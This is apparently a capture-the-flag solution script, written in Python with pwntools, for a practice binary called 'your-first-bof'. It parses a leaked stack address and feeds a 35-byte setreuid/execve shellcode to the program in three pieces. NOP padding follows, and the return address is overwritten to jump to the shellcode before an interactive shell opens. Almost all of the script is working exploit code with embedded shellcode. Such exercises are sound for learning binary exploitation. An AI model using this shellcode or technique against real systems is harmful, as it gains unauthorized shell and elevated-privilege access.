from pwn import *

target='./your-first-bof'
p=process(target, stdin=PTY)
io=p

io.recv()
msg=str(io.recv())
msg=msg.split("name: ")[1]
msg=msg.split("addr of comment")[0]
addr_str=msg[:-2]
addr_hex=int(addr_str, 16)

# length=35; setreuid shell code
shellcode=b'\x6a\x31\x58\x31\xd2\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80'

"""
In gdb,

Address of name: 0xffa31e40
Address of sid: 0xffa31e50
Address of comment: 0xffa31e60

return address: 0xffa31e7c
"""

data=shellcode[:16]
io.sendline(data)

data=shellcode[16:32]
io.sendline(data)

data=shellcode[32:35]+b'\x90'*25
data=data+p32(addr_hex) # address of name
io.sendline(data)

io.interactive()
